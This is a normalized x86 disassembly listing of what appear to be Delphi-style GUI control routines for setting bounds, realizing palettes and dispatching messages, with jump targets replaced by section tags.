je r-xdata
mov al 0x1
pop ebx
retn
sub_433b18
push ebx
mov ebx eax
mov eax ebx
call sub_419b60
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x120 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_433b40
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_434be4
sub_433b60
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
sub_433b80
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x80
mov edx esi
call sub_403ecc
sub_433ba4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_434ad4
sub_433bc4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x120 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x124 ] edx
sub_433bf0
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d8
mov edi eax
mov eax [ edi + 0x74 ]
mov esi [ ebx + 0x18 ]
cmp eax [ esi + 0x158 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d8
mov edx [ edi + 0x78 ]
mov eax [ esi + 0x154 ]
call sub_404284
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d8
mov al [ edi + 0x70 ]
cmp al [ esi + 0x150 ]
je r-xdata
mov al 0x1
sub_433c54
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_434530
sub_433c74
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_43451c
sub_433c94
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0x150 ] bl
sub_433cb4
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_419270
mov [ ebx + 0x3c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebx + 0x38 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c388
mov esi eax
mov [ ebx + 0x68 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_434c64
mov al [ r-xdata ]
mov [ ebx + 0x61 ] al
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4337d4
mov esi eax
mov [ ebx + 0x74 ] esi
mov [ esi + 0x1c ] ebx
mov [ esi + 0x18 ] sub_435b1c
mov [ ebx + 0x70 ] 0xff000005
mov [ ebx + 0x57 ] 0x1
mov [ ebx + 0x58 ] 0x1
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x9a ] 0x1
mov [ ebx + 0x60 ] 0x1
mov [ ebx + 0x5e ] 0x0
mov [ ebx + 0x7a ] 0xfff4
mov eax [ r-xdata ]
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x150 ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_433d8c
push ebx
push esi
push edi
add esp 0xfffffff0
call sub_4034b4
mov ebx edx
mov edi eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_454378
mov eax [ edi + 0xa0 ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40349c
push edi
xor ecx ecx
mov edx 0xb039
call sub_435d5c
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov edx esp
mov eax edi
call sub_434554
mov ecx esp
or edx 0xffffffff
mov eax edi
mov si 0xffcc
call sub_403324
xor eax eax
mov [ edi + 0xa0 ] eax
jmp r-xdata
mov eax [ edi + 0x6c ]
call sub_403128
xor eax eax
mov [ edi + 0x6c ] eax
mov eax [ edi + 0x74 ]
call sub_403128
mov eax [ edi + 0x68 ]
call sub_403128
mov eax [ edi + 0x64 ]
call sub_4085f4
mov edx ebx
and dl 0xfc
mov eax edi
call sub_4192bc
test bl bl
jle r-xdata
sub_433e58
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
sub_433e80
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] dl
mov ebp eax
xor ebx ebx
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
mov si 0xffd7
call sub_403324
mov edi eax
test edi edi
je r-xdata
lea edx [ esp + 0x4 ]
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
mov al [ esp ]
xor al 0x1
neg al
sbb eax eax
push eax
push edi
push esi
call SelectPalette
mov edi eax
push esi
call RealizePalette
test eax eax
je r-xdata
push 0xffffffff
push edi
push esi
call SelectPalette
push esi
mov eax [ esp + 0x8 ]
push eax
call ReleaseDC
mov bl 0x1
mov eax ebp
mov edx [ eax ]
call [ edx + 0x7c ]
sub_433f08
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x61 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x61 ] al
mov eax ebx
call sub_434208
sub_433f28
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
or [ ebx + 0x50 ] 0x8000
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
mov eax [ ebx + 0x6c ]
call sub_403128
xor eax eax
mov [ ebx + 0x6c ] eax
and [ ebx + 0x50 ] 0xffff7fff
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x6c ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_436b78
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_403324
mov edx ebx
mov eax edi
call sub_419340
mov eax ebx
mov si 0xffd9
call sub_403324
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x6c ] eax
pop edi
pop esi
pop ebx
retn
sub_433ff0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x8
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4196d0
and [ ebx + 0x54 ] 0xfff7
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_435d5c
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_435d5c
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_435d5c
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax ebx
call sub_435d5c
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_435d5c
sub_434084
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_41958c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x7c ]
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp edi eax
jne r-xdata
xor edx edx
mov eax esi
call sub_434b6c
jmp r-xdata
xor edx edx
mov eax esi
call sub_433f28
sub_4340c8
push ebx
push esi
push edi
push ecx
mov ebx edx
mov edi eax
mov al [ edi + 0x5b ]
cmp bl al
je r-xdata
mov eax edi
mov si 0xffd0
call sub_403324
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] al
mov [ edi + 0x5b ] bl
xor eax eax
mov al bl
mov dl [ eax + rw-data ]
mov eax edi
call sub_433f08
test [ edi + 0x1c ] 0x1
jne r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
cmp bl 0x6
je r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
cmp [ esp ] 0x6
je r-xdata
mov al [ esp ]
dec eax
sub al 0x2
setb al
mov edx ebx
add dl 0xfd
sub dl 0x2
setb dl
cmp al dl
jne r-xdata
mov eax edi
mov si 0xffee
call sub_403324
mov al [ esp ]
test al al
je r-xdata
sub al 0x5
je r-xdata
test bl bl
je r-xdata
sub bl 0x5
je r-xdata
mov eax [ edi + 0x4c ]
push eax
mov eax [ edi + 0x48 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx [ edi + 0x40 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_434170
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea ecx [ ebp + 0x8 ]
lea edx [ ebp + 0xc ]
mov eax ebx
call sub_4362ec
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp esi [ ebx + 0x40 ]
jne r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_434ffc
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_434208
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
push 0x0
xor ecx ecx
mov edx 0x47
mov eax ebx
call sub_435d5c
mov eax ebx
mov si 0xffd0
call sub_403324
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov eax ebx
mov si 0xffcf
call sub_403324
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
sub_434208
push ebx
push esi
add esp 0xfffffff0
mov esi eax
cmp [ esi + 0x62 ] 0x0
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
jne r-xdata
mov bl [ esi + 0x61 ]
mov al [ r-xdata ]
cmp al bl
jne r-xdata
test bl 0x4
je r-xdata
xor eax eax
mov [ esi + 0x90 ] eax
xor eax eax
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
sar eax 0x1
jns r-xdata
test bl 0x1
je r-xdata
add eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
adc eax 0x0
mov eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
sar eax 0x1
jns r-xdata
test bl 0x2
je r-xdata
test bl 0x8
je r-xdata
add eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
adc eax 0x0
mov eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
mov [ esi + 0x8c ] eax
jmp r-xdata
test [ ebx + 0x1c ] 0x2
je r-xdata
mov ebx [ esi + 0x30 ]
test ebx ebx
je r-xdata
mov eax ebx
call sub_43b694
test al al
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x48 ]
mov [ esi + 0x90 ] eax
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x4c ]
mov [ esi + 0x94 ] eax
mov edx esp
mov eax [ esi + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ esi + 0x90 ] eax
mov eax [ esp + 0xc ]
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ ebx + 0x1fa ]
mov [ esi + 0x90 ] eax
mov eax [ ebx + 0x1fe ]
mov [ esi + 0x94 ] eax
jmp r-xdata
sub_434324
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x1
pop esi
pop ebx
retn
sub_434348
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx edx
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x2
pop esi
pop ebx
retn
sub_434370
push ebx
push esi
mov esi eax
push edx
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x4
pop esi
pop ebx
retn
sub_434394
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
push edx
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x8
pop esi
pop ebx
retn
sub_4343b8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0xa0 ]
je r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x400
xor edx edx
push ebp
push sub_4344b3
push [ fs : edx ]
mov [ fs : edx ] esp
cmp ebx 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
cmp ebx eax
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffe4
call sub_403324
test ebx ebx
je r-xdata
cmp [ eax + 0x178 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4344ba
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfbff
retn
mov edi eax
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xffffffff
je r-xdata
mov eax [ eax + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_4139fc
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
cmp [ ebx + 0x178 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffbf
call sub_403324
test edi edi
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc5
call sub_403324
jmp r-xdata
mov eax [ ebx + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_41375c
sub_4344c4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
jne r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_434ffc
mov edx edi
mov eax ebx
call sub_434574
mov edx edi
mov eax ebx
call sub_435e00
jmp r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
cmp esi 0xffffffff
jne r-xdata
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_434530
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea eax [ ebx + 0x154 ]
mov edx esi
call sub_403ecc
pop esi
pop ebx
retn
mov [ ebx + 0x150 ] 0x0
sub_434574
push ebx
push esi
push edi
push ebp
mov esi eax
mov eax [ edx + 0x8 ]
mov edi [ edx ]
sub eax edi
push eax
mov eax [ edx + 0xc ]
mov ebp [ edx + 0x4 ]
sub eax ebp
push eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4345d0
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_4345fc
mov edx eax
mov ecx esp
mov eax esi
call sub_41245c
mov edx esp
mov eax ebx
call sub_434a40
pop ecx
pop edx
pop esi
pop ebx
retn
sub_434614
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_4345b8
mov ecx esp
mov edx esi
call sub_41245c
mov edx esp
mov eax ebx
call sub_434a40
pop ecx
pop edx
pop esi
pop ebx
retn
sub_43463c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4346bd
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebx + 0x40 ]
add [ esi ] eax
mov eax [ ebx + 0x44 ]
add [ esi + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4346c4
lea eax [ ebp - 0xc ]
call sub_403e78
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405978
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b340
call sub_4038b4
sub_4346cc
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
add eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
add eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_4346f8
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
sub eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_434724
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
mov edx esi
mov eax ebx
call sub_4508cc
sub_434754
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebx + 0xa0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ rw-data ] 0x0
jne r-xdata
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov [ ebp - 0x10 ] edi
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx ebx
mov edx 0xb042
mov eax esi
call sub_435d5c
sub_4347d0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov edi edx
mov esi eax
cmp edi [ esp ]
je r-xdata
mov al [ r-xdata ]
mov [ esi + 0x98 ] al
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
je r-xdata
mov bl [ r-xdata ]
mov bl [ esi + 0x98 ]
jmp r-xdata
mov ebp [ esi + 0x40 ]
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
push eax
call sub_405fa4
mov ebp eax
jmp r-xdata
test bl 0x1
je r-xdata
mov eax [ esi + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call sub_405fa4
mov [ esp + 0x4 ] eax
jmp r-xdata
test bl 0x2
je r-xdata
mov eax [ esi + 0x48 ]
mov [ esp + 0x8 ] eax
test [ esi + 0x51 ] 0x1
jne r-xdata
test bl 0x4
je r-xdata
mov eax [ esi + 0x4c ]
mov [ esp + 0xc ] eax
test [ esi + 0x51 ] 0x2
jne r-xdata
test bl 0x1
je r-xdata
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x90 ]
push eax
call sub_405fa4
mov [ esi + 0x90 ] eax
test bl 0x8
setne dl
test al al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x48 ]
push eax
call sub_405fa4
mov [ esp + 0x8 ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
add eax [ esi + 0x48 ]
push eax
call sub_405fa4
sub eax ebp
mov [ esp + 0x8 ] eax
jmp r-xdata
cmp [ esi + 0x59 ] 0x0
jne r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x94 ]
push eax
call sub_405fa4
mov [ esi + 0x94 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call sub_405fa4
mov [ esp + 0xc ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
add eax [ esi + 0x4c ]
push eax
call sub_405fa4
sub eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
test bl 0x8
setne al
test al al
je r-xdata
test bl 0x10
je r-xdata
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov ecx [ esp + 0xc ]
mov edx ebp
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov ebx [ esi + 0x68 ]
mov eax ebx
call sub_41c7e0
push eax
call sub_405fa4
mov edx eax
mov eax ebx
call sub_41c7fc
sub_43499c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_434a32
push [ fs : eax ]
mov [ fs : eax ] esp
test [ edi + 0x50 ] 0x20
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_4197c8
test bl bl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_434bb4
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x8 ]
call sub_404284
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434a39
lea eax [ ebp - 0x8 ]
call sub_403e78
retn
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_434be4
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
mov bl 0x1
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
test [ esi + 0x1c ] 0x1
je r-xdata
sub_434a40
push ebx
push esi
push edi
add esp 0xffffffe8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x48 ]
sub eax [ esp + 0x10 ]
add eax [ esp ]
push eax
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x18 ]
add eax [ esp + 0x8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_434a88
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
jne r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3c0
call sub_4038b4
test esi esi
je r-xdata
mov edx ebx
call sub_438008
mov edx ebx
mov eax esi
call sub_437f34
mov eax ebx
call sub_434208
sub_434ad4
push ebx
push esi
push edi
mov ebx edx
mov edi eax
cmp bl [ edi + 0x57 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov si 0xffcd
call sub_403324
mov [ edi + 0x57 ] bl
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb00b
mov eax edi
call sub_435d5c
mov eax edi
mov si 0xffd0
call sub_403324
sub_434b6c
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x7c ] esi
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_448e0c
mov edx ebx
mov eax esi
call sub_419340
sub_434b90
push ebx
mov ebx eax
push edx
xor ecx ecx
mov eax ebx
mov edx 0xc
call sub_435d5c
push 0x0
xor ecx ecx
mov edx 0xb012
mov eax ebx
call sub_435d5c
pop ebx
retn
sub_434bb4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_434b28
mov ebx eax
mov eax edi
mov ecx ebx
xor edx edx
call sub_403f68
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
lea ecx [ ebx + 0x1 ]
mov edx [ edi ]
mov eax esi
call sub_434b38
sub_434be4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_434c39
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_434bb4
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_404284
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434c40
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
mov eax esi
call sub_404338
mov edx eax
mov eax ebx
call sub_434b90
sub_434c64
push ebx
mov ebx eax
mov [ ebx + 0x59 ] 0x0
mov [ ebx + 0x56 ] 0x0
mov eax [ ebx + 0x68 ]
call sub_41c73c
cmp eax [ ebx + 0x84 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb00e
mov eax ebx
call sub_435d5c
pop ebx
retn
or [ ebx + 0x98 ] 0x10
mov eax [ ebx + 0x68 ]
call sub_41c73c
mov [ ebx + 0x84 ] eax
sub_434dec
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_434ddc
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor eax eax
call sub_431d84
mov eax esi
call sub_431d84
jmp r-xdata
sub_434e24
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x198 ]
mov edx ebx
call sub_413914
test eax eax
jl r-xdata
mov edx [ ebx + 0x30 ]
mov edi [ edx + 0x198 ]
mov edx [ edi + 0x8 ]
